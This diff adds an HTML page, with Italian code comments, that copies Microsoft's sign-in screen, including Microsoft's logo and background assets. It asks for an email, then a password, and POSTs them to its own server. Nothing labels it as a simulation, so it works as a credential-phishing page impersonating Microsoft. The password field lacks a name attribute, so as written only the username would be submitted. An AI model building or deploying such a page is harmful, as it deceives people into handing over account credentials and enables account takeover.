@@ -1,0 +1,216 @@
+<!DOCTYPE html><html lang="it"><head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Sign in to your Microsoft Account</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_11d9e3bcdfede9ce5ce5ace2d129f1c4.svg');
+            background-size: cover;
+            background-repeat: no-repeat;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-box {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            background-color: #fff;
+            padding: 44px;
+
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 320px;
+            overflow: hidden;
+        }
+
+        .login-box img {
+            max-width: 256px;
+            height: 24px;
+            margin-bottom: 20px;
+        }
+
+        #titolo {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .login-box input {
+            border: none;
+            outline: none;
+            font-size: 15px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            width: 100%;
+            padding: 0px;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid black;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        p {
+            font-size: 13px;
+            font-weight: 400;
+        }
+
+        a {
+            color: rgb(0, 103, 184);
+        }
+
+        button {
+            width: 108px;
+            height: 32px;
+            border: none;
+        }
+
+        #button-container {
+            display: flex;
+            justify-content: flex-end;
+            margin-top: 40px;
+        }
+
+        #indietro {
+            background-color: rgba(0, 0, 0, 0.2);
+            color: black;
+            margin-right: 5px;
+        }
+
+        #indietro:hover {
+            background-color: rgba(0, 0, 0, 0.3);
+            cursor: pointer;
+        }
+
+        #avanti {
+            background-color: rgb(0, 103, 184);
+            color: white;
+        }
+
+        #avanti:hover {
+            background-color: #005da6;
+            cursor: pointer;
+        }
+
+        .box-container {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        #key-box {
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            font-weight: 400;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 320px;
+            background-color: white;
+        }
+
+        #key-box img {
+            padding-left: 44px;
+            padding-right: 10px;
+            height: 32px;
+
+        }
+
+        .form-section {
+            display: none;
+        }
+
+        .form-section.active {
+            display: block;
+        }
+
+
+        .error-message {
+            color: red;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div id="section-username" class="box-container form-section active">
+            <div class="login-box">
+                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo"/>
+                <div id="titolo">Sign in</div>
+
+                <form id="form-username" action="" onsubmit="return false;" method="POST">
+                    <input id="username" class="form-input" type="text" name="username" placeholder="Email, phone or Skype" required=""/>
+                    <div class="error-message" id="username-error"></div>
+                    <p>No account? <a href="javascript:void(0)">Create one!</a></p>
+                    <p><a href="javascript:void(0)">Can&#39;t access your account?</a></p>
+                    <div id="button-container">
+                        <button id="indietro" href="javascript:void(0)">Back</button>
+                        <button id="avanti" type="button" class="submit-button" onclick="validateEmail()">Next</button>
+                    </div>
+                </form>
+            </div>
+            <div id="key-box">
+                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="key"/>
+                <p>Sign-in Option</p>
+            </div>
+        </div>
+
+        <div id="section-password" class="box-container form-section">
+            <div class="login-box">
+                <img src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft Logo"/>
+                <div id="titolo">Enter Password</div>
+
+                <form id="form-password" action="" method="POST">
+                    <input type="hidden" id="hidden-username" name="username"/>
+                    <input id="password" class="form-input" type="password" required="" placeholder="Password"/>
+                    <div class="error-message" id="password-error"></div>
+                    <p><a href="javascript:void(0)">Forgot my password</a></p>
+                    <div id="button-container">
+                        <button id="avanti" type="submit" class="submit-button" onclick="return validatePassword()">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        function validateEmail() {
+            var email = document.getElementById('username').value;
+            // Regex aggiornata per escludere punti consecutivi
+            var regex = /^(?!.*\.\.)[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (regex.test(email)) {
+                document.getElementById('hidden-username').value = email; // Passa l'identificativo alla seconda form
+                document.getElementById('section-username').classList.remove('active');
+                document.getElementById('section-password').classList.add('active');
+                document.getElementById('username-error').textContent = ''; // Pulisce il messaggio di errore
+            } else {
+                document.getElementById('username-error').textContent = 'Per favore inserisci un indirizzo email valido.';
+            }
+        }
+
+        function validatePassword() {
+            var password = document.getElementById('password').value;
+            if (password.length < 6) {
+                document.getElementById('password-error').textContent = 'La password deve contenere almeno 6 caratteri.';
+                return false; // Impedisce il submit del form
+            } else {
+                document.getElementById('password-error').textContent = ''; // Pulisce il messaggio di errore
+                return true; // Permette il submit del form
+            }
+        }
+    </script>
+
+
+
+</body></html>
